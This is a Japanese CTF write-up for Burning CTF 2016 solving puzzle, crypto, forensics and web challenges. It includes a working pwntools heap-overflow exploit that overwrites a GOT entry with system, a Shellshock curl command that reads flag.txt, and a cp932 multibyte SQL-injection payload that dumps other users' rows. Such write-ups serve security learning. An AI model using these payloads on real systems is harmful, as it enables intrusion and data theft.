---
layout: post
redirect_from:
  - /writeup/ctf/2016/burning-ctf/
  - /blog/2016/02/07/burning-ctf/
date: 2016-02-07T13:00:00+09:00
tags: [ "ctf", "writeup", "burning-ctf" ]
"target_url": [ "http://burningctf.yamatosecurity.com/score/puzzle" ]
---

# 場阿忍愚CTF writeup

## 101 練習     image level 1

画像をくっつける。

## 111 芸術      ワットイズディス？

>   ヒント１：セキュリティが大好きな大和魂なら分かります！

との事なので、日本語の文字列として無理矢理読んで`大和セキュリティ`。

## 112 芸術     cole nanee?

>   フラグは漢字一文字で願い申し上げ候。

画像はそのまま漢字であるとすると、`忍`かなと推測。

## 113 芸術      Lines and Boxes

文字の背景の模様が無意味に見えたので、とりあえずこれを消してgoogle画像検索に。

-   `xu bing square word calligraphy`
-   [アルファベットを漢字風に表現する「新英文書法」の文字生成プログラムの開発(テーマセッション,文字・文書の認識・理解)](http://ci.nii.ac.jp/naid/110008002802)
-   [The Art of Xu Bing: Words Without Meaning, Meaning Without Words (Asian Art and Culture)](http://www.amazon.co.jp/dp/0295981431)

みたいなのが引っかかる。`word paly`。

## 121 二進術 壱萬回

10000回解けばよい。やるだけ。

ただし、stdinやstdoutにpipeを繋ぐと、flushがなされないのか、問題の式が出てこない。
これを騙す。

ぐぐると、[`pexpect`](https://pypi.python.org/pypi/pexpect/)が良さげ。
`isatty`関数を上書きするような方法もでてきたが、動かなかった。

``` python
#!/usr/bin/env python3
import pexpect
p = pexpect.spawn('./121-calculation')
while True:
    s = ''
    while True:
        c = p.read_nonblocking(timeout=1).decode()
        print(c, end='')
        if c == '=':
            break
        elif c == '/':
            s += '//'
        elif c == '\n' or c == '\r':
            s = ''
        else:
            s += c
    p.sendline(str(eval(s)))
```

```
$ ./121.py
FLAG_5c33a1b8860e47da864714e042e13f1e
Traceback (most recent call last):
...
./121.py  10.01s user 1.63s system 1% cpu 16:52.97 total
```

10分掛かった。

## 131 解読術 image level 5

zipを解答すると、文字が1つ書かれた画像がたくさんでてくる。

``` sh
$ unzip -l 131-mondai.zip
Archive:  131-mondai.zip
Length      Date    Time    Name
---------  ---------- -----   ----
1009  2015-09-13 08:56   eccbc87e4b5ce2fe28308fd9f2a7baf3.png
1610  2015-09-13 08:59   8f14e45fceea167a5a36dedd4bea2543.png
1009  2015-09-13 09:00   45c48cce2e2d7fbdea1afc51c7c6ad26.png
 339  2015-09-13 08:58   1679091c5a880faf6fb5e6087eb1b2dc.png
1360  2015-09-13 08:57   a87ff679a2f3e71d9181a67b7542122c.png
1298  2015-09-13 08:55   c4ca4238a0b923820dcc509a6f75849b.png
1225  2015-09-13 08:59   c9f0f895fb98ab9159f51fd0297e236d.png
1800  2015-09-13 08:56   c81e728d9d4c2f636f067f89cc14862c.png
 367  2015-09-13 08:57   e4da3b7fbbce2345d7772b0674a318d5.png
---------                     -------
10017                     9 files
```

ファイル名に意味はあるのだろうかと検索すると、md5によるハッシュ値で、単一の数字であるということが分かる。例えば、

``` sh
$ echo -n 3 | md5sum
eccbc87e4b5ce2fe28308fd9f2a7baf3  -
```

この数字の順に画像を読むと、`KOUBE-GYU`。

## 132 解読術 Ninjya Crypto

`忍者 暗号`で検索すると、忍者文字というのがでてくるので変換。
`ヤマトイエバ`と出るがこれはflagではなく、`川`と答える。

## 141  攻撃術  craSH

適当に色々試してたら勝手に答えがでてきた。

``` sh
$ nc 210.146.64.35 31337
$ echo AAAA > foo
$ cat foo foo foo foo > foo
*** Error in `/home/crash/crash': double free or corruption (out): 0x00000000007e90d0 ***
That's enough!
flag={NoMoreBashdoor}
```

問題だったのは関数`args_cat`。

``` c
void args_cat(char *args[], size_t num, struct file *output);
```

引数として指定されたファイルと出力先として指定されたファイルが同一のときが問題。
まず引数のファイルたちの長さの総和を求め、出力先のファイルの長さに代入し領域を確保する。
これにより引数のファイルの長さの総和が変化してしまい、確保した領域より長く書き込んでしまう。


## 142 攻撃術   Ninja no Aikotoba

逆変換をする。

``` python
>>> ''.join(map(lambda x: chr(ord(x[0]) ^ x[1]), zip('Kawa', [0x12, 0x00, 0x1a, 00])))
'Yama'
```

次もやるだけ。

``` python
>>> ''.join(map(chr, [0o164,111,0x6f]))
'too'
```

整形/整理して理解した内容を使って枝を刈った上でloopを回す。`KansaiTanaka`。

``` c
void encrypt(char *a, int *b) {
    for (int i = 0; i < 6; i++) {
        b[i]   = a[i] - a[i+6];
        b[i+6] = 2*(a[i] & a[i+6]) + (a[i] ^ a[i+6]);
    }
}
```

``` c
#include <stdio.h>
#define repeat(i,n) for (int i = 0; (i) < (n); ++(i))

void encrypt(char *a, int *b){int c,d,e;for(c=0;c<6;c++){b[c]=0,e=c[a];while(d=e&-e){c[b]+=d;e-=d;}}for(d=0;d<6;d++){e=d[a+6];while(c=e&-e){b[d+6]=((d[a]&a[d+6])<<1L)+(a[d]^d[a+6]);d[b]-=c;e-=c;};}}

int main(void) {
    int result[12] = { -9, 0, 0, 18, -10, 8, 159, 194, 220, 212, 204, 202 };
    char ans[13] = {};
    repeat (i,256) {
        repeat (j,256) {
            char a[12] = { i,i,i,i,i,i, j,j,j,j,j,j };
            int b[12];
            encrypt(a, b);
            repeat (k,256) {
                if (result[k] == b[0] && result[k+6] == b[6]) {
                    ans[k]   = a[0];
                    ans[k+6] = a[6];
                }
            }
        }
    }
    printf("%s\n", ans);
    return 0;
}
```

短いのでそのまま総当たり。`Zach`。

``` c
#include <stdio.h>
#include <string.h>
#include <openssl/md4.h>
#define repeat(i,n) for (int i = 0; (i) < (n); ++(i))
#define repeat_alpha(i) repeat (i,256) if (isupper(i) || islower(i))

const unsigned char hash[] = { 0xaa, 0x1b, 0xf8, 0xca, 0xe5, 0x99, 0xb1, 0x93, 0x66, 0xa8, 0xbd, 0x4b, 0x87, 0xdd, 0xd3, 0x27 };

int main(void) {
    repeat_alpha (a) {
        repeat_alpha (b) {
            repeat_alpha (c) {
                repeat_alpha (d) {
                    char s[5] = { a, b, c, d };
                    unsigned char t[MD4_LBLOCK];
                    MD4(s, 4, t);
                    if (memcmp(t, hash, MD4_LBLOCK) == 0) {
                        printf("%s\n", s);
                        return 0;
                    }
                }
            }
        }
    }
    return 1;
}
```

適当におおきいの突っ込んだら答えがでてきた。なにこれ[^1]。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools

context.log_level = 'debug'

p = remote('210.146.64.35', 31338)
p.recvuntil('Kawa? : ')
p.sendline('Yama')
p.recvuntil('So then next? : ')
p.sendline('too')
p.recvuntil('-9 0 0 18 -10 8 159 194 220 212 204 202? : ')
p.sendline('KansaiTanaka')
p.recvuntil('aa1bf8cae599b19366a8bd4b87ddd327? : ')
p.sendline('Zach')
p.recvuntil('And the rest? : ')
p.send('x' * 2000)

p.interactive()
```

## 143  攻撃術  craSH 2

与えられるソースをよく読めばそう難しくはない。
heap上のoverflowであるがmetadataを操作する必要はほぼなく、64bitであることも特に効いてこない。

### 解説

#### a

`141 攻撃術 craSH`の続きである。
heap上でのoverflowを使った攻撃となる。

heapに乗るdataとしては主に以下の構造体と`char *data`の中身である。`char *`である`file.data`を書き換えれば、任意のアドレスへの読み書きが可能になる。
一旦これができたとして話を続ける。

``` c
struct file {
    size_t len;
    char *data;
};

struct node {
    char *key;
    struct file *val;
    struct node *next;
};
```

防御機構に関して、`Partial RELRO`なのでgotへの書き込みは可能であるので、これを使う。ただし`NX enabled`が立っているのでheap上にshellcodeを置いても機能しない。

``` sh
$ checksec --file craSH
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   craSH
```

ソースをよく読むと、`strchr`のgotを`system`へのアドレスに書き換えれば、shellscript片を実行させられることに気付く。

``` c
void remove_newline(char *p) {
    char *idx = strchr(p, '\n');
    if (idx != NULL) *idx = '\0';
}

int main(void) {
    ...

    printf("$ ");
    fgets(input, sizeof(input), stdin);
    remove_newline(input);

    ...
}
```

xinetd型の問題であるのでこれで十分である。`strchr`のアドレスをleakさせることができ、libcは与えられている。よってこれでflagが手に入る。

#### b

さて問題はheap overflowによる任意のアドレスの読み書きである。
プログラムをcrashさせてしまうと失敗となるので、必要な場所のみを正確に書き換えなければならない。

今回はどの領域も小さいので、chunkのmetadataはそのchunkの大きさのみである。これを壊さないように気を付けるだけでよい。特にchunkの大きさは`0x20`となり、gdbで覗くと`PREV_INUSE` bitを乗せた`0x21 ('!')`が一定感覚で見られるだろう。

ファイルの中身のdataをoverflowさせfile構造体のfieldを書き換えたいので、heap上でこのふたつのchunkが連続するように準備する必要がある。
単純にファイルを作製していくと確保の順番の影響でそうはならないが、一旦確保した領域を`realloc`で拡張する際に移動させるとこれが可能になる。例えば`echo AAAA > $a \n echo BBBB > $b \n echo AAAAAAAAAAAAAAAAAAAAAAA > $a \n echo CCCC > $c \n`とするとファイル`$b`のdataの直後にファイル`$c`のfile構造体が置かれる。
gdb上で確認したいときは`break quit`として`run <<<$'echo AAAA > $a \n echo BBBB > $b \n echo AAAAAAAAAAAAAAAAAAAAAAA > $a \n echo CCCC > $c \n exit \n'`とするとよい。

そして攻撃をする。`$c`の`.data`に`strchr`のgot `0x603038`を入れる。
`raw_cat`がNULL文字を許容し改行文字を付与しないことを使って、`$a`, `$b`, `$c`にそれぞれ`\x38\x30\x60\0\0\0\0` (8 byte), ` ` (0 byte), `\x21\0\0\0\0\0\0\0` (8 byte)を書き込み、この状態から`cat $c $b $b $a > $b`とする。$8 + 0 + 0 + 8$が`$b`の長さに代入され、$8 + 16 + 16 + 8$ byteが`$b`に書き込まれる。最後の$8$ byteは`strchr`のgotのアドレスであり書き込みは成功し、他の部分も適当な値が書き込まれ検知されない。
もしchunkのheaderを壊してしまうと`realloc`の際に落ちるので注意。

ここから`cat $c`とすると`strchr`のアドレスが得られ、これにより`system`のアドレスが計算できるので、これを`$c`に書き戻せばよい。

### 実装

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--remote', action='store_true')
args = parser.parse_args()

context.log_level = 'debug'
if args.remote:
    p = remote('210.146.64.35', 31337)
else:
    p = process(['./craSH'])

strchr_got_plt = 0x603038
p.send('echo AAAA > $a \n'
        + 'echo BBBB > $b \n'
        + 'echo AAAAAAAAAAAAAAAAAAAAAAA > $a \n'
        + 'echo CCCC > $c \n'
        + 'cat > $a \n' + p64(strchr_got_plt) + '\x04'
        + 'cat > $b \n\x04'
        + 'cat > $c \n\x21\0\0\0\0\0\0\0\x04'
        + 'cat $c $b $b $a > $b \n'
        + 'echo done \n')
p.recvuntil('done')
p.recvuntil('$ ')
p.send('cat $c \n')
strchr = u64(p.recvuntil('$ ')[:8])
libc = strchr - 0x86e20 - 0x30
system = libc + 0x46640
print(hex(strchr))
print(hex(libc))
print(hex(system))
p.send('cat > $c \n' + p64(system) + '\x04')
# p.send('ls\n') # shellscript
p.send('cat flag2_hard_to_guess_lolololol.txt\n') # shellscript
p.send('exit\n')
p.recvall()
```


## 161  電網術  ftp is not secure.

とりあえず

``` sh
$ strings 161-problem.pcap
```

とすると、`RkxBR3tYVEluWDY5bnF2RmFvRXd3TmJ9Cg==`という文字列が見えたので、base64 decodeするとflagだった。
`FLAG{XTInX69nqvFaoEwwNb}`。

## 162  電網術  ベーシック

``` sh
$ wireshark-gtk 162-basic.pcap
```

見つかる`Authorization: Basic`の行は以下。

``` sh
$ echo dXNlcm5hbWU6cGFzc3dvcmQ= | base64 -d
username:password
$ echo cm9vdDpwYXNzd29yZA== | base64 -d
root:password
$ echo aHR0cDovL2J1cm5pbmcubnNjLmdyLmpw | base64 -d
http://burning.nsc.gr.jp
```

[wikipedia](https://ja.wikipedia.org/wiki/Basic%E8%AA%8D%E8%A8%BC)より、

>   Basic認証では、ユーザ名とパスワードの組みをコロン ":" でつなぎ、Base64でエンコードして送信する。

ということである。
とりあえず`http://burning.nsc.gr.jp`を叩くとuserとpasswordを聞かれる。
user: `http`, password: `//burning.nsc.gr.jp`とすると通る。
`flag={BasicIsNotSecure}`

## 171  諜報術  KDL

web archiveへ。
<http://web.archive.org/web/19981207002916/http://www.kdl.co.jp/>を見ると、`ソフトウェア開発エンジニア`。

## 173 諜報術   Akiko-chan

画像検索する。クエリにwordpressと添えるとよい。

## 174  諜報術  タナカハック

`(答えはwww.yamatosecurity.comに公開されているファイルにあります。)`であるが、htmlを眺めても該当しそうなものはない。
wgetしてgrepしてやればどうだろうと思い、試す。

``` sh
$ wget --recursive --domains www.yamatosecurity.com,www.tanakazakku.com -e robots=off www.tanakazakku.com/yamatosecurity
$ grep --text tana.\*123 **/*
www.tanakazakku.com/yamatosecurity/files/networkforensics1.pdf:               <rdf:li>tanakazakkarini123</rdf:li>
<</Author(tanakazakkarini123)/CreationDate(D:20130422102054Z)/Creator(Microsoft PowerPoint)/Keywords()/ModDate(D:20150918163456+09'00')/Producer(Mac OS X 10.6.8 Quartz PDFContext)>0000000000 65535 f
```

## 181  記述術  search_duplicate_character_string

やる。はりきってrolling hashを使ってしまったが、解が短いのでもっと無理矢理な方法でも可能だっただろう。
定数倍重めの$O(n^2)$。

``` c++
#include <iostream>
#include <set>
#include <unordered_set>
#define repeat(i,n) for (int i = 0; (i) < (n); ++(i))
#define repeat_from(i,m,n) for (int i = (m); (i) < (n); ++(i))
constexpr uint64_t prime = 1000000007;
using namespace std;
int main() {
    string s; cin >> s;
    int n = s.size();
    set<string> prev_dup_subs; // previous duplicated substrings
    repeat_from (l,1,n) {
        cerr << l << endl;
        set<string> dup_subs;
        unordered_set<uint64_t> subs;
        uint64_t e = 1;
        uint64_t h = 0; // rolling hash
        repeat (i,l) {
            e = e * prime;
            h = h * prime + s[i]; // mod 2^64
        }
        subs.insert(h);
        repeat_from (i,l,n) {
            h = h * prime + s[i] - s[i-l] * e; // mod 2^64
            if (subs.count(h)) {
                dup_subs.insert(s.substr(i-l+1,l));
            } else {
                subs.insert(h);
            }
            if (dup_subs.size() >= 2) break;
        }
        if (dup_subs.size() == 0) {
            for (string t : prev_dup_subs) {
                cout << t << endl;
            }
            break;
        } else {
            prev_dup_subs.swap(dup_subs);
        }
    }
    return 0;
}
```

flag: `f_sz!bp_$gufl=b?za>is#c|!?cxpr!i><`

## 182 記述術 JavaScript Puzzle

javascriptの穴埋めをする。
こうなる。

``` javascript
window["eval"]["call"]`${
    [ (0O000101), (0b1001100), (101), 0x52, 0x54 ]
    ["map"](x=>String["fromCodePoint"](x))["join"]("")["toLowerCase"]() +"(1)"
}`;
```

綺麗に書くとこう。

``` javascript
window.eval.call(
    [ 0x41, 0x4c, 0x65, 0x52, 0x54
    ].map(x => String.fromCodePoint(x)).join("").toLowerCase() +"(1)"
);
```

`Flag={4c0bf259050d08b8982b6ae43ad0f12be030f191}`。
javascriptの、辞書とobjectを同じように使える仕様は好きです。

## 183  記述術  Count Number Of Flag's SubString!

とりあえずまず道具を定義。

``` sh
$ q() { curl -s 'http://210.146.64.36:30840/count_number_of_flag_substring/?count=count&str='"$(urlencode "$@")" | grep -o '[0-9]\+' }
```

文字の頻度から詰めていってもよいが、今回のflagは`flag={`から始まるということが分かっているので、先頭から一文字ずつ決定していく。

``` sh
$ s='flag={' ; for c in {a..z} _ \{ \} ; do echo -n "$s$c " ; q "$s$c" ; done
```

から始めて`$s`を更新していく。
手でやるのは面倒なので、もちろんやらせる。

``` sh
$ s='flag={' ; while [[ ! "$(urlencode "$s")" =~ %7B ]] ; do for c in {a..z} _ \{ \} ; do if [ "$(q "$s$c")" = 1 ] ; then s="$s$c" ; break ; fi ; done ; echo "$s" ; done
```

`flag={afsfdsfdsfso_idardkxa_hgiahrei_nxnkasjdx_hfuidgire_anreiafn_dskafiudsurerfrandskjnxxr}`

## 184 記述術 解凍?

ひたすら解凍する。logが流れていく様はちょっと楽しい。

``` sh
#!/bin/sh
cp 184-flag.txt flag
while true ; do
    file flag
    case `file flag` in
        *'bzip2 compressed data'* )
            mv flag flag.bz2
            bunzip2 flag.bz2
            ;;
        *'Zip archive data'* )
            mv flag flag.zip
            unzip flag.zip
            ;;
        *'POSIX tar archive'* )
            mv flag flag.tar
            tar xf flag.tar
            ;;
        *'gzip compressed data'* )
            mv flag flag.gz
            gunzip flag.gz
            ;;
        * )
            break
            ;;
    esac
    [ -e flag.txt ] && mv flag.txt flag
done
```

## 185 記述術 Make sorted Amida kuji!!

あみだくじがある。高さと幅及び入力はステージごとに固定されている。
入力はshuffleされているので、これを整列するような棒の置き方を全て提出せよ。

つまり普通の競技の問題。やるだけ。これもちょっとやりすぎたように見える。30ステージぐらいあるつもりで書いた。

``` c++
#include <iostream>
#include <vector>
#include <algorithm>
#include <functional>
#include <cassert>
#define repeat(i,n) for (int i = 0; (i) < (n); ++(i))
#define repeat_from(i,m,n) for (int i = (m); (i) < (n); ++(i))
using namespace std;
bool valid_amida_row(vector<bool> const & row, int num) {
    if (row.size() != num) return false;
    if (row[num-1]) return false;
    repeat (i,num-1) if (row[i] and row[i+1]) return false;
    return true;
}
vector<int> amida_apply_row(vector<bool> const & row, vector<int> numbers) {
    int num = numbers.size();
    assert (valid_amida_row(row, num));
    repeat (i,num-1) if (row[i]) {
        swap(numbers[i], numbers[i+1]);
    }
    return numbers;
}
void make_amida_row(int i, vector<bool> & row, function<void ()> callback) {
    int num = row.size();
    if (i == num-1) {
        callback(); // row is passed implicitly
    } else {
        make_amida_row(i+1, row, callback);
        if (i == 0 or not row[i-1]) {
            row[i] = true;
            make_amida_row(i+1, row, callback);
            row[i] = false;
        }
    }
}
void make_graphs(int y, vector<vector<bool> > & acc, vector<int> const & numbers, vector<vector<vector<bool> > > & graphs) {
    int num = numbers.size();
    if (y == 0) {
        if (is_sorted(numbers.begin(), numbers.end())) {
            cerr << graphs.size() << endl;
            repeat (i,num) {
                repeat (j,num) {
                    if (acc[i][j]) {
                        cerr << i << ' ' << j << endl;
                    }
                }
            }
            assert (find(graphs.begin(), graphs.end(), acc) == graphs.end());
            graphs.push_back(acc);
        }
    } else {
        repeat (x,numbers.size()) {
            if (abs(numbers[x] - x) > y) {
                return;
            }
        }
        vector<bool> row(num);
        make_amida_row(0, row, [&]() {
            acc.push_back(row);
            make_graphs(y-1, acc, amida_apply_row(row, numbers), graphs);
            acc.pop_back();
        });
    }
}
vector<vector<vector<bool> > > stage_graphs(vector<int> const & numbers) {
    int num = numbers.size();
    vector<vector<vector<bool> > > graphs;
    vector<vector<bool> > acc;
    make_graphs(num, acc, numbers, graphs);
    cerr << graphs.size() << " amidas found." << endl;
    return graphs;
}
string make_flag(int NUM, vector<vector<vector<bool> > > const & G) {
    /* --- var G ---
       G[k].get(i,j) = 0 or 1
       does k-th Accepted sorted Amidakuzi's i-th row, j-th calumn exist?
       if it exist, value is 1
       else value is 0.
       ---------------- */
    string flag_str = "";
    const string strtes="qwertyuiopasdfghjklzxcvbnm1234567890_+=";
    for(int i=0;i<NUM;i++){
        for(int j=0;j<NUM;j++){
            int sum = 0;
            for(int k=0;k<G.size();k++){
                sum += G[k][i][j];
            }
            flag_str += strtes.substr(sum%strtes.length(),1);
        }
    }
    return flag_str;
}
int main(int argc, char **argv) {
    if (argc <= 1) {
        cerr << "Usage: " << argv[0] << "NUMBER..." << endl;
        return 1;
    }
    vector<int> numbers;
    repeat_from (i,1,argc) numbers.push_back(atoi(argv[i]));
    cout << make_flag(numbers.size(), stage_graphs(numbers)) << endl;
    return 0;
}
```


## 191  超文書転送術    GIFアニメ生成サイト

htmlのソースを見てみると、生成画像に連番でidが降ってある。
画像は`/movies/view/9999`という形で取得する。
試しに`/movies/view/1`にアクセスするとforbidden。
他の画像はokあるいはnot foundなので、ここにflagがありそうだと判断できる。

gif画像を生成する際の通信をブラウザの開発者ツールで眺めていると、自分の生成した画像は`/movies/newgif/9999`という形で取得されていることに気付く。
となると`/movies/newgif/1`が怪しく、試すとflag画像がでてくる。

gif動画の1コマだけにflagが写るので、手元に落として分解。image magicを使う。

``` sh
$ convert +adjoin 1.gif flag.gif
$ ls
1.gif         flag-107.gif  flag-15.gif  flag-23.gif  flag-31.gif  flag-3.gif   flag-48.gif  flag-56.gif  flag-64.gif  flag-72.gif  flag-80.gif  flag-89.gif  flag-97.gif
flag-0.gif    flag-108.gif  flag-16.gif  flag-24.gif  flag-32.gif  flag-40.gif  flag-49.gif  flag-57.gif  flag-65.gif  flag-73.gif  flag-81.gif  flag-8.gif   flag-98.gif
flag-100.gif  flag-109.gif  flag-17.gif  flag-25.gif  flag-33.gif  flag-41.gif  flag-4.gif   flag-58.gif  flag-66.gif  flag-74.gif  flag-82.gif  flag-90.gif  flag-99.gif
flag-101.gif  flag-10.gif   flag-18.gif  flag-26.gif  flag-34.gif  flag-42.gif  flag-50.gif  flag-59.gif  flag-67.gif  flag-75.gif  flag-83.gif  flag-91.gif  flag-9.gif
flag-102.gif  flag-110.gif  flag-19.gif  flag-27.gif  flag-35.gif  flag-43.gif  flag-51.gif  flag-5.gif   flag-68.gif  flag-76.gif  flag-84.gif  flag-92.gif
flag-103.gif  flag-11.gif   flag-1.gif   flag-28.gif  flag-36.gif  flag-44.gif  flag-52.gif  flag-60.gif  flag-69.gif  flag-77.gif  flag-85.gif  flag-93.gif
flag-104.gif  flag-12.gif   flag-20.gif  flag-29.gif  flag-37.gif  flag-45.gif  flag-53.gif  flag-61.gif  flag-6.gif   flag-78.gif  flag-86.gif  flag-94.gif
flag-105.gif  flag-13.gif   flag-21.gif  flag-2.gif   flag-38.gif  flag-46.gif  flag-54.gif  flag-62.gif  flag-70.gif  flag-79.gif  flag-87.gif  flag-95.gif
flag-106.gif  flag-14.gif   flag-22.gif  flag-30.gif  flag-39.gif  flag-47.gif  flag-55.gif  flag-63.gif  flag-71.gif  flag-7.gif   flag-88.gif  flag-96.gif
```

## 192  超文書転送術    Network Tools

``` plain
GNU bash, version 4.1.2(1)-release (x86_64-redhat-linux-gnu)
```

というヒントが出た。shellshock(`CVE-2014-6271`)を試してみると、成功する。

``` sh
$ curl 'http://210.146.64.37:60888/exec' -H 'User-Agent: () { :;}; /bin/cat flag.txt' --data 'cmd=ps&option='
```

`flag={Update bash to the latest version!}`

## 194  超文書転送術    YamaToDo

まず、

``` php
$ie = (isset($_GET['ie']) === true) ? preg_replace('/[^a-z0-9]/', '', strtolower((string)$_GET['ie'])) : mb_internal_encoding();
$ie = ($ie !== 'sjis') ? $ie : die('sjis? so sweeeeeeeeeet');
mysqli_query($link, sprintf('set names %s', $ie));
```

というのが気になるので、これを調べる。
phpとdbのencodingの認識の差を用いた脆弱性があることが分かる。
例えば、`char s[3] = { 0x95, '\\', '\'' };`というbyte列が、utf8では`謎の文字` `\` `'`と解釈されるが、sjisあるいはcp932では`表` `'`と解釈される。utf8としてquoteを行うと`謎の文字` `\` `\` `\` `'`となるが、この結果をsjisとして解釈してunquoteすると`表` `\` `'`となる。最後の`'`は生の`'`であるので、injectionが成立する。
`sjis`は弾かれるが`cp932`は弾かれないようになっているので、これを`/?ie=cp932`と指定する。

次に、入力箇所を探す。
`$userID`からのinjectionは`preg_match('/[^a-zA-Z0-9]/', $userId)`といった確認が入るのでだめ。
`$password`は`$password = hash_hmac('sha512', $password, YAMATODO_SALT);`と処理されるのでこれもだめ。
残るはlogin後の`$body`で、これはinjectionできる。

``` php
$sql = sprintf("insert into todos (`user_id`, `body`, `create_at`) values ('%s', '%s', NOW())",
    mysqli_real_escape_string($link, $_SESSION['user_id']),
    mysqli_real_escape_string($link, $body)
);
mysqli_query($link, $sql);
```

という形で入る。


とりあえず適当にregisterしてloginする。短い名前にしておく楽。

``` sh
# user_id: N
$ python -c 'print(ord("N"))'
78
$ PHPSESSID=$(ブラウザからこぴぺ)
```

``` sh
$ python -c 'print(*map(ord,"yamato"))'
121 97 109 97 116 111
```

いんじぇくと☆（ゝω・）v

``` sh
$ sql=%95$(urlencode \\\'', now()), (concat(char(78)), (select hex(body) from todos as t where user_id = concat(char(121),char(97),char(109),char(97),char(116),char(111)) limit 1 offset 0), now()); # ')
$ curl --dump-header - 'http://210.146.64.44/?ie=cp932' -H 'Cookie: PHPSESSID='$PHPSESSID -H 'Authorization: Basic eWFtYXRvY3RmOkdVbjdTbjFMVkpRWkJ3eUc4d1pQQUl0bm9CWjA0VGx4' --data body=$sql
```

`offset 0`の部分をincrementしながら全部出力させる。

`flag = mkafh98hwaofnaslh08y4830fjioafnlka`とあるが、これを投げても通らない。これはもしかしたら他の参加者が勝手に追加したものなのかもしれない。
`Yo! check the first todo☆（ゝω・）v`とあるので、1番目のtodoを見る。
文字化けしているが、これをeucjpで見ると、`半角でサブミットしてください☆（ゝω・）v ｆｌａｇ＝｛ｒ３ｍ３Ｍｂ３ｒ＿５ｃ＿ｐｒ０ｂＬ３ｍ｝`。
`r3m3Mb3r_5c_pr0bL3m`。

### 試行錯誤の結果得られた知見

-   mysqlの行コメント`-- `は後ろに空白が必須。
-   `mysqli_query`は複文が使えない。
-   `insert into TABLE (COL,COL,COL) values (VAL,VAL,VAL), (VAL,VAL,VAL);`とすれば、複数同時に挿入できる。
    -   mysqlは無設定だと文字列連結演算子がないので、これを使わないと文字列の挿入ができない。
-   hmacのsaltを復元しようとしても無理。
    -   yamatoの暗号化済みpasswordは`8c8f0144c4290bf5e4afa6ebe67597484935e6af3c7f3610bffb3b4782fb8f420ec30c21467b58dcc0023749225e9aa1ea938b2d73391ca5a30b5c19f1e2af53`。
    -   `hashcat`などを試してみたが、どうみても終わりそうにない。
-   injection中のsub queryから`todos`を直接見れない。
    -   `ERROR 1093 (HY000): Table 'todos' is specified twice, both as a target for 'INSERT' and as a separate source for data`
        -   循環してるからどうにかして、ということ。
        -   自己結合`from TABLE as XXXX`を使えば回避できる。
    -   `todos`と`users`が非対称だったのですごく悩んだ。
        -   手元に実行環境作って試すのはすごく重要。

## 201 兵法術  将棋詰め壱

詰将棋をする。

## 202 兵法術   将棋詰め弐

詰将棋をする、のだけど、右下の盤の数字の`四`と`七`が入れ替わっている。

## 203 兵法術  将棋詰め参

詰将棋をする。

## 204 兵法術  将棋詰め四

詰将棋をする。


<hr>

[^1]: かなり偶然上手くいっただけっぽい。
